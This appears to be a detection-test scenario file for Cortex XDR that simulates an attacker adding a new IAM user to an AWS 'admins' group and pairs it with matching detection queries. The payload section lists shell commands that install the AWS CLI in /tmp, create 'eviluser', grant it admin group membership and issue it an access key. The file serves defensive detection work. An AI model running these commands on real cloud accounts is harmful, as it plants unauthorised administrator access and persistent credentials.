identity.name: Unusual AWS User Added to Group via CLI
identity.summary: An attacker uses AWS CLI to add a new user to an administrative group, triggering an anomaly detection for unusual group membership changes. Cortex should detect the AWS CLI process execution with ele
identity.description: An attacker uses AWS CLI to add a new user to an administrative group, triggering an anomaly detection for unusual group membership changes. Cortex should detect the AWS CLI process execution with elevated permissions and network traffic to AWS endpoints.

payload.code:
mkdir -p /tmp/aws
wget -O /tmp/aws/aws-cli https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip
unzip /tmp/aws/aws-cli -d /tmp/aws/
chmod +x /tmp/aws/aws
/tmp/aws/aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
/tmp/aws/aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
/tmp/aws/aws iam create-user --user-name eviluser
/tmp/aws/aws iam add-user-to-group --group-name admins --user-name eviluser
/tmp/aws/aws iam create-access-key --user-name eviluser

expected_artifacts.description: AWS CLI process execution with elevated privileges
Outbound connection to AWS IAM service endpoint
AWS CLI binary created in temporary directory

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: AWS CLI User Group Membership Change
biocs.description: Detection of AWS CLI process adding user to administrative group
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/aws/aws'
| filter action_process_command_line contains 'add-user-to-group'
| filter action_process_command_line contains 'admins'

abiocs.name: Unusual AWS User Group Membership
abiocs.description: Behavioral deviation in AWS user being added to administrative group outside normal patterns
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/aws/aws'
| filter action_process_command_line contains 'add-user-to-group'
| filter action_process_command_line contains 'admins'
| filter actor_process_image_name != 'sudo'
| filter actor_process_image_name != '/bin/bash'
abiocs.causality_anchor: AWS CLI process execution with group membership modification

xql_queries.name: AWS CLI Group Membership Changes
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/aws/aws'
| filter action_process_command_line contains 'add-user-to-group'
| filter action_process_command_line contains 'admins'
| filter not action_process_command_line contains 'sudo'
| fields action_process_image_name, action_process_command_line, agent_hostname
